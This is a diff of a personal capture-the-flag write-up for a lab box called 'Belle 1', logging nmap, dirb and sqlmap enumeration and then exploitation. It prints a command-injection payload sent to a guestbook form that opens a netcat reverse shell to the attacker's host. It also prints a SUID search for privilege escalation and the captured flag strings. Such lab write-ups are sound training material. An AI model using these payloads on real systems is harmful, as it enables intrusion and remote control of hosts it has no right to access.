@@ -6,12 +6,11 @@
 
 Launch: Tuesday, November 17th - 8:00 AM EST
 Ends: Monday, November 23rd - 5PM EST
-
-I accidentally did the harder one and didn't get the flag, will try again tomorrow!
+Rank: 10th on Leader board (updated 11/19/2020)
 
 
 # Belle 1
-> May Phan November 17, 2020 6pm
+> May Phan November 17, 2020
 
 ## 1 Run nmap
 
@@ -24,34 +23,25 @@ nothing interesting on 10.10.20.3, just one line of html title and header
 found phpmyadmin portal > admin,admin didn't work
 
 ## run dirbuster to find common file extension
-
-
 ````
 dirb http://10.10.20.3/ /usr/share/dirb/wordlists/big.txt -w -X ".asp,.html,.htm,.php,.xml,.jsp"
 ````
 
 a ha! found http://10.10.20.3/roster.php
 
-
-
 ## Roster Lookup
 
 Look up Belle?
 
 return 
-
 ``
 Name: Belle
 Role: Princess
 "Have your really read every one of these books?"
 ``
-
 Belle from Beauty and the beast? Rose petal? Books? princess?
-
 Look up Beast
-
 return 
-
 ```
 "Here's where she meets Prince Charming, but she won't discover that it's him 'til chapter three!"
 ```
@@ -65,6 +55,14 @@ dumped to CSV file '/root/.local/share/sqlmap/output/10.10.20.3/dump/castle/Secr
 ```
 
 Secret.cvs is large file with a ton of hex characters.. 
+
+
+translated from hex but a flag is not found
+
+`GMZDGMZTGYZTGMZWGMZTGMBTGYZTIMZWGM2TGMZTGUFDAYJTGYZTMMZTGMYTGMZTG4ZTMMZWGMZT
+GMRTGMZTGMZTGMYDGMZTGMZTMMZUGMZTGOJTGMZTCMZTGM4DGMZTGEZTONRUGMYAUNRRGBQQU===
+`
+it's not base 64
 
 staff.csv has some data
 
@@ -127,6 +125,38 @@ this one timed out. what does it mean
 (!) FATAL: Too many errors connecting to host
     (Possible cause: OPERATION TIMEOUT)
 ``
+
+ok let's navigate to that
+
+it's a guestbook
+view source shows POST method with input 
+we cam get a shell from that 
+
+
+`
+root@kali:/home/may# curl -X POST http://10.10.20.3/cadS49Adb3g76/ -d "input_name=a;system('/bin/nc.traditional -nv 10.10.0.77 4444 -e /bin/bash')&input_text=b&Submit=submit"
+`
+
+got a shell!! Found flag.txt 
+
+`
+flag2{cc46091749e55f33fe4046b9c8855a13}
+`
+
+escate priviledge
+
+`
+find / -user root -perm -4000 -exec ls -ldb {} \;
+`
+
+`
+cat /home/public/flag.txt
+flag3{ee195d0d8ee3e759f300116f0829468b}
+cat /root/flag.txt
+flag4{0fe769de0194b20822e561a57864ac48}
+That's it.
+`
+
 
 
 
